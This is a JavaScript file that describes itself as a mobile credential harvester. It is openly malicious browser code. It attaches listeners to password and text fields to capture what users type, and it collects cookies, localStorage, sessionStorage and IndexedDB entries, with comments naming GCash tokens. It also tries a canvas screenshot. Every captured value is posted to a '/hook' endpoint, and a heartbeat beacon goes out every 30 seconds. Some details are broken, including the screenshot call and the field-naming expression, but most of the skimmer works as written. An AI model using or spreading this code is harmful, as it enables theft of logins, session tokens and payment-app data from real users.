// Mobile-first credential harvester (Android/iOS)
(async function() {
    const deviceId = 'mobile_' + btoa(navigator.userAgent + screen.width + screen.height + Math.random());
    
    // 1. STEAL FORM DATA (live)
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            mutation.addedNodes.forEach(function(node) {
                if (node.tagName === 'INPUT' && node.type === 'password') {
                    node.addEventListener('input', function() {
                        exfil('keystroke', this.value);
                    });
                }
            });
        });
    });
    observer.observe(document.body, { childList: true, subtree: true });
    
    // 2. HARVEST ALL INPUTS
    document.querySelectorAll('input[type="password"], input[type="text"]').forEach(input => {
        input.addEventListener('input', function() {
            exfil('form_' + input.name || input.id || 'unknown', this.value);
        });
    });
    
    // 3. MOBILE-SPECIFIC STEALTH
    if ('webkitStorageInfo' in navigator || /Android|iPhone|iPad/.test(navigator.userAgent)) {
        // Cookie theft
        exfil('cookies', JSON.stringify(document.cookie));
        
        // LocalStorage (GCash tokens, etc)
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            exfil('localStorage_' + key, localStorage.getItem(key));
        }
        
        // SessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
            exfil('session_' + sessionStorage.key(i), sessionStorage.getItem(sessionStorage.key(i)));
        }
        
        // IndexedDB (GCash app data)
        if (window.indexedDB) {
            indexedDB.databases().then(dbs => {
                dbs.forEach(db => {
                    exfil('indexeddb', JSON.stringify(db));
                });
            });
        }
    }
    
    // 4. SCREENSHOT VIA CANVAS (desktop/mobile)
    function captureScreen() {
        const canvas = document.createElement('canvas');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(document.documentElement, 0, 0);
        exfil('screenshot', canvas.toDataURL('image/jpeg', 0.1));
    }
    setTimeout(captureScreen, 3000);
    
    // 5. EXFIL FUNCTION
    async function exfil(type, value) {
        try {
            await fetch('/hook', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    device_id: deviceId,
                    type: type,
                    value: value,
                    user_agent: navigator.userAgent,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                })
            });
        } catch(e) {}
    }
    
    // 6. BEACON EVERY 30s
    setInterval(() => {
        exfil('heartbeat', 'alive');
    }, 30000);
    
    // Initial beacon
    exfil('initial', document.title + ' | ' + window.location.href);
    
})();
